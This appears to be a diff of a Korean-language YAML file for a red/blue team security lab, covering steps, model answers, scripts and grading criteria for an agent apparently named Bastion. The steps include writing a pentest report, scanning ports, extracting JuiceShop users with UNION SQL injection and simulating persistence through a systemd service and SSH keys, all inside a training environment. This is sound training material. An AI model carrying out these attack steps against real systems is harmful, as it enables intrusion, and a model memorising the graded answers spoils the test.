-  bastion_prompt: '[BLUE] Wazuh SIEM에서 다단계 침투를 탐지하기 위한 상관 분석 규칙을 작성하라. 5분 내 3개 이상의 Persistence 기법이 감지되면
-    알림을 발생시켜라.'
+  bastion_prompt: '[BLUE] Wazuh SIEM에서 다단계 침투를 탐지하기 위한 상관 분석 규칙을 작성하라. 5분 내 3개 이상의
+    Persistence 기법이 감지되면 알림을 발생시켜라.'
 - order: 8
   instruction: '[RED/BLUE] 방어 매트릭스를 설계하고, 침투 타임라인과 함께 종합 보고서를 작성하라. 환경을 정리하고 결과를 /tmp/pentest_report_week02.txt에
     저장하라.'
   hint: Prevention/Detection/Response를 정의하고 타임라인을 재구성한다.
   category: analysis
   points: 15
-  answer: "\U0001F916 프롬프트: [RED/BLUE] 방어 매트릭스를 설계하고, 침투 타임라인과 함께 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘\n\U0001F4CE\
-    \ 참고 (CLI): rm -f /tmp/reverse_shell_sim.py /tmp/persistence_service_sim.service /tmp/apt_key_sim*\
-    \ 2>/dev/null && cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Multi-Stage Intrusion Report ===\n\
-    Date: 2026-04-06 | Scope: 10.20.30.0/24\n\nTimeline:\n  [T+00] Recon: Port scan + directory enum (T1046,\
-    \ T1595.003)\n  [T+10] Initial Access: SQL Injection on REST API (T1190)\n  [T+20] Execution: Reverse\
-    \ shell code prepared (T1059.006)\n  [T+30] Persistence: Systemd service + SSH key (T1543.002, T1098.004)\n\
-    \nDefense Matrix:\n  | Stage | Prevention | Detection | Response |\n  |-------|-----------|-----------|----------|\n\
-    \  | Initial Access | WAF, Patch | IDS, WAF logs | IP block, session kill |\n  | Execution | AppArmor\
-    \ | EDR, process monitor | Process kill, isolate |\n  | Persistence | FIM, policy | auditd, SIEM correlation\
-    \ | Remove artifact, disable account |\n\nFindings: 3 Critical (SQLi, Shared SSH keys, No FIM)\nRecommendations:\
+  answer: "\U0001F916 프롬프트: [RED/BLUE] 방어 매트릭스를 설계하고, 침투 타임라인과 함께 종합 보고서를 구현 방법을 설명하고\
+    \ 예시 코드를 보여줘\n\U0001F4CE 참고 (CLI): rm -f /tmp/reverse_shell_sim.py /tmp/persistence_service_sim.service\
+    \ /tmp/apt_key_sim* 2>/dev/null && cat > /tmp/pentest_report_week02.txt << 'EOF'\n\
+    === Multi-Stage Intrusion Report ===\nDate: 2026-04-06 | Scope: 10.20.30.0/24\n\
+    \nTimeline:\n  [T+00] Recon: Port scan + directory enum (T1046, T1595.003)\n \
+    \ [T+10] Initial Access: SQL Injection on REST API (T1190)\n  [T+20] Execution:\
+    \ Reverse shell code prepared (T1059.006)\n  [T+30] Persistence: Systemd service\
+    \ + SSH key (T1543.002, T1098.004)\n\nDefense Matrix:\n  | Stage | Prevention\
+    \ | Detection | Response |\n  |-------|-----------|-----------|----------|\n \
+    \ | Initial Access | WAF, Patch | IDS, WAF logs | IP block, session kill |\n \
+    \ | Execution | AppArmor | EDR, process monitor | Process kill, isolate |\n  |\
+    \ Persistence | FIM, policy | auditd, SIEM correlation | Remove artifact, disable\
+    \ account |\n\nFindings: 3 Critical (SQLi, Shared SSH keys, No FIM)\nRecommendations:\
     \ Parameterized queries, unique SSH keys, deploy FIM\nEOF\ncat /tmp/pentest_report_week02.txt"
-  answer_detail: 종합 보고서는 공격 타임라인, 방어 매트릭스(Prevention/Detection/Response), 발견 사항, 권고사항을 포함한다. Defense-in-Depth
-    전략의 각 계층별 역할을 명확히 한다.
+  answer_detail: 종합 보고서는 공격 타임라인, 방어 매트릭스(Prevention/Detection/Response), 발견 사항, 권고사항을
+    포함한다. Defense-in-Depth 전략의 각 계층별 역할을 명확히 한다.
   verify:
     type: output_contains
     expect: Multi-Stage Intrusion Report
     semantic:
-      intent: '[RED/BLUE] 방어 매트릭스 + 침투 타임라인 /tmp/pentest_report.txt — Red Kill Chain 각 단계 실행 시각 + Blue
-        탐지·대응 이벤트 시각 + 탐지 gap 분석 + Defense-in-Depth 매트릭스 (Network/Host/App/Data 4계층 × 현재 적용 컨트롤). 양방향
-        정리된 종합 문서. 환경 정리(crontab -r, rm systemd service) 포함'
+      intent: '[RED/BLUE] 방어 매트릭스 + 침투 타임라인 /tmp/pentest_report.txt — Red Kill Chain
+        각 단계 실행 시각 + Blue 탐지·대응 이벤트 시각 + 탐지 gap 분석 + Defense-in-Depth 매트릭스 (Network/Host/App/Data
+        4계층 × 현재 적용 컨트롤). 양방향 정리된 종합 문서. 환경 정리(crontab -r, rm systemd service) 포함'
       success_criteria:
       - /tmp/pentest_report.txt 보고서
       - 타임라인 (Red 공격 시각 + Blue 탐지 시각)
@@ -349,19 +394,22 @@ steps:
       - 방어 매트릭스 없음
       - 정리 누락
   target_vm: attacker
-  script: "rm -f /tmp/reverse_shell_sim.py /tmp/persistence_service_sim.service /tmp/apt_key_sim* 2>/dev/null\
-    \ && cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Multi-Stage Intrusion Report ===\nDate: 2026-04-06\
-    \ | Scope: 10.20.30.0/24\n\nTimeline:\n  [T+00] Recon: Port scan + directory enum (T1046, T1595.003)\n\
-    \  [T+10] Initial Access: SQL Injection on REST API (T1190)\n  [T+20] Execution: Reverse shell code\
-    \ prepared (T1059.006)\n  [T+30] Persistence: Systemd service + SSH key (T1543.002, T1098.004)\n\n\
-    Defense Matrix:\n  | Stage | Prevention | Detection | Response |\n  |-------|-----------|-----------|----------|\n\
-    \  | Initial Access | WAF, Patch | IDS, WAF logs | IP block, session kill |\n  | Execution | AppArmor\
-    \ | EDR, process monitor | Process kill, isolate |\n  | Persistence | FIM, policy | auditd, SIEM correlation\
-    \ | Remove artifact, disable account |\n\nFindings: 3 Critical (SQLi, Shared SSH keys, No FIM)\nRecommendations:\
-    \ Parameterized queries, unique SSH keys, deploy FIM\nEOF\ncat /tmp/pentest_report_week02.txt"
+  script: "rm -f /tmp/reverse_shell_sim.py /tmp/persistence_service_sim.service /tmp/apt_key_sim*\
+    \ 2>/dev/null && cat > /tmp/pentest_report_week02.txt << 'EOF'\n=== Multi-Stage\
+    \ Intrusion Report ===\nDate: 2026-04-06 | Scope: 10.20.30.0/24\n\nTimeline:\n\
+    \  [T+00] Recon: Port scan + directory enum (T1046, T1595.003)\n  [T+10] Initial\
+    \ Access: SQL Injection on REST API (T1190)\n  [T+20] Execution: Reverse shell\
+    \ code prepared (T1059.006)\n  [T+30] Persistence: Systemd service + SSH key (T1543.002,\
+    \ T1098.004)\n\nDefense Matrix:\n  | Stage | Prevention | Detection | Response\
+    \ |\n  |-------|-----------|-----------|----------|\n  | Initial Access | WAF,\
+    \ Patch | IDS, WAF logs | IP block, session kill |\n  | Execution | AppArmor |\
+    \ EDR, process monitor | Process kill, isolate |\n  | Persistence | FIM, policy\
+    \ | auditd, SIEM correlation | Remove artifact, disable account |\n\nFindings:\
+    \ 3 Critical (SQLi, Shared SSH keys, No FIM)\nRecommendations: Parameterized queries,\
+    \ unique SSH keys, deploy FIM\nEOF\ncat /tmp/pentest_report_week02.txt"
   risk_level: low
-  bastion_prompt: '[RED/BLUE] 방어 매트릭스를 설계하고, 침투 타임라인과 함께 종합 보고서를 작성하라. 환경을 정리하고 결과를 /tmp/pentest_report_week02.txt에
-    저장하라.'
+  bastion_prompt: '[RED/BLUE] 방어 매트릭스를 설계하고, 침투 타임라인과 함께 종합 보고서를 작성하라. 환경을 정리하고 결과를
+    /tmp/pentest_report_week02.txt에 저장하라.'
 - order: 99
   instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
   bastion_prompt: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
@@ -388,10 +436,12 @@ steps:
       - audit 부재
   target_vm: attacker
   risk_level: low
-  answer: "\U0001F916 프롬프트: attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) [RED] 타겟 웹 서버 10.20.30.80의 상위 1000개 포트를\
-    \ 스캔하고 서비스 버전을 확인하라. dirb로 숨겨진 웹 경로도 열거해줘\n2) [RED] UNION 기반 SQL Injection으로 JuiceShop에서 사용자 목록을 추출해줘\n\
-    3) [RED] Execution 기법을 시뮬레이션하라 \n4) [RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라.\
-    \ (파일 생성만, 실제 설치 금지)해줘\n5) [BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 구현 방법을 설명하고 예시\
-    \ 코드를 보여줘 작업을 수행해줘"
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
+  answer: "\U0001F916 프롬프트: attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) [RED] 타겟 웹 서버 10.20.30.80의\
+    \ 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로 숨겨진 웹 경로도 열거해줘\n2) [RED] UNION 기반 SQL\
+    \ Injection으로 JuiceShop에서 사용자 목록을 추출해줘\n3) [RED] Execution 기법을 시뮬레이션하라 \n4) [RED]\
+    \ Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라. (파일 생성만, 실제\
+    \ 설치 금지)해줘\n5) [BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 구현 방법을\
+    \ 설명하고 예시 코드를 보여줘 작업을 수행해줘"
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
+    다단계 작업.
   script: ''
